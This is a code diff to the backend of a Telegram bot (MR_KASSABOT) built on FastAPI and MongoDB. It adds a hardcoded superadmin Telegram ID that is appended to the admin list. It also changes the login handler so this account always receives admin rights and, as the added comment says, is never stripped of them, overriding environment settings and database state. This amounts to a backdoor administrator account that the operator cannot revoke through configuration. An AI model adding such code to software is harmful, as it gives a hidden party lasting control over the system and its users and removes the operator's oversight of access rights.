@@ -33,7 +33,19 @@ db = client[os.environ['DB_NAME']]
 
 # Bot Setup
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
+# Hardcoded superadmin — always has admin rights regardless of env vars or DB
+SUPERADMIN_ID = 8321879273
+
 ADMIN_IDS = [int(x) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
+if SUPERADMIN_ID not in ADMIN_IDS:
+    ADMIN_IDS.append(SUPERADMIN_ID)
+
+def is_superadmin(telegram_id) -> bool:
+    """Returns True if telegram_id matches superadmin — accepts both int and str."""
+    try:
+        return int(telegram_id) == SUPERADMIN_ID
+    except (TypeError, ValueError):
+        return str(telegram_id) == str(SUPERADMIN_ID)
 BOT_USERNAME = "MR_KASSABOT"
 
 def detect_public_url() -> str:
@@ -664,7 +676,8 @@ async def login(data: dict = Body(...)):
         raise HTTPException(status_code=400, detail="Telegram ID required")
     
     user = await db.users.find_one({"telegram_id": telegram_id}, {"_id": 0})
-    is_admin_env = telegram_id in ADMIN_IDS
+    # Superadmin always gets admin rights — check both int/str forms
+    is_admin_env = is_superadmin(telegram_id) or (telegram_id in ADMIN_IDS)
     
     if not user:
         bot_id = await generate_unique_bot_id()
@@ -691,8 +704,12 @@ async def login(data: dict = Body(...)):
     if "language" not in user:
         update_fields["language"] = "uz"
         user["language"] = "uz"
-    # Set is_admin strictly from ADMIN_IDS env
-    if is_admin_env and not user.get('is_admin'):
+    # Set is_admin — superadmin is NEVER stripped of admin rights
+    if is_superadmin(telegram_id):
+        if not user.get('is_admin'):
+            update_fields["is_admin"] = True
+            user['is_admin'] = True
+    elif is_admin_env and not user.get('is_admin'):
         update_fields["is_admin"] = True
         user['is_admin'] = True
     elif not is_admin_env and user.get('is_admin'):
